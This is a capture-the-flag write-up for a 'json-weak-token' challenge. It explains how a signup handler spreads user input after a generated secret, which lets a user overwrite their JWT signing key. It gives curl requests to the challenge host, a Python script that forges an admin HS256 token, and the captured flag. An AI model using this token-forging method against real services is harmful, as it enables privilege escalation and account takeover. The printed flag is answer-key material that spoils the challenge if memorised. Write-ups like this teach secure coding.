# json-weak-token Writeup

## Summary

The server lets users sign up and issues JWTs. During signup, the server generates a secret but then merges user input afterward, allowing the user to overwrite the secret. With a known secret, we can sign our own JWT containing `admin: true` and retrieve the flag.

## Root Cause

In `/signup`, user input is spread **after** the generated secret:

```js
users[user.name] = {
  secret: nanoid(32),
  ...user,
};
```

Supplying `secret` in the signup payload overwrites the server secret for that user.

## Exploit Steps

### 1) Register with a chosen secret

```bash
curl -s -X POST https://c04-json-weak-token-0.kaze.chal.sh/signup \
  -H "Content-Type: application/json" \
  -d '{"user":{"name":"timo","secret":"pwnedsecret"}}'
```

### 2) Forge an admin JWT (HS256)

```bash
python3 - <<'PY'
import json,base64,hmac,hashlib

def b64url(x): return base64.urlsafe_b64encode(x).rstrip(b'=')

header = b64url(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
payload = b64url(json.dumps({"name":"timo","admin":True}).encode())
msg = header+b'.'+payload
sig = b64url(hmac.new(b"pwnedsecret", msg, hashlib.sha256).digest())
print((msg+b'.'+sig).decode())
PY
```

### 3) Request the flag

```bash
curl -s -X POST https://c04-json-weak-token-0.kaze.chal.sh/flag \
  -H "Content-Type: application/json" \
  -d '{"token":"PASTE_FORGED_JWT_HERE"}'
```

## Flag

```
bsideshk{4_b1t_0f_1d0r_w17h_j20N_w34k_70Ken}
```
